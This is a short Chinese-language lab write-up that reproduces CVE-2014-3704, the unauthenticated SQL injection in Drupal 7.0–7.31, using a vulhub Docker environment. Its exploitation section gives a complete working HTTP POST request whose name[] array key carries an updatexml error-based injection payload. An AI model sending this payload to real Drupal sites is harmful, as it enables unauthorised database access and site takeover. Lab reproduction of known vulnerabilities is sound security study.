Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。

Drupal
是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。

影响版本： 7.0~7.31

本文仅作漏洞复现记录与实现，利用流程如下:

一、漏洞环境

本环境采用vulhub搭建

执行以下指令完成环境搭建

cd drupal/CVE-2014-3704/

docker-compose up -d

启动完毕后会开启8080端口

漏洞链接:http://192.168.101.152:8080/

![1617004012_606185ecec325f62df7ac.png!small](https://image.3001.net/images/20210329/1617004012_606185ecec325f62df7ac.png!small)

初次访问需要安装，采用默认安装即可，Mysql数据库名填写drupal，数据库用户名、密码为root，地址为mysql

![1617004099_60618643f2c8af00e72d9.png!small](https://image.3001.net/images/20210329/1617004099_60618643f2c8af00e72d9.png!small)

安装完成后，访问首页如下：

![1617004215_606186b732401aa6312c1.png!small](https://image.3001.net/images/20210329/1617004215_606186b732401aa6312c1.png!small)

二、漏洞利用

直接发送数据包

POST /?q=node&destination=node HTTP/1.1  
Host: 192.168.101.152:8080  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 120

pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or
updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a

即可触发漏洞，注意Content-Type要设置为application/x-www-form-urlencoded

![1617004428_6061878cd47420c93e8a8.png!small](https://image.3001.net/images/20210329/1617004428_6061878cd47420c93e8a8.png!small)

查询数据库

![1617004456_606187a885fa793462917.png!small](https://image.3001.net/images/20210329/1617004456_606187a885fa793462917.png!small)

到此结束

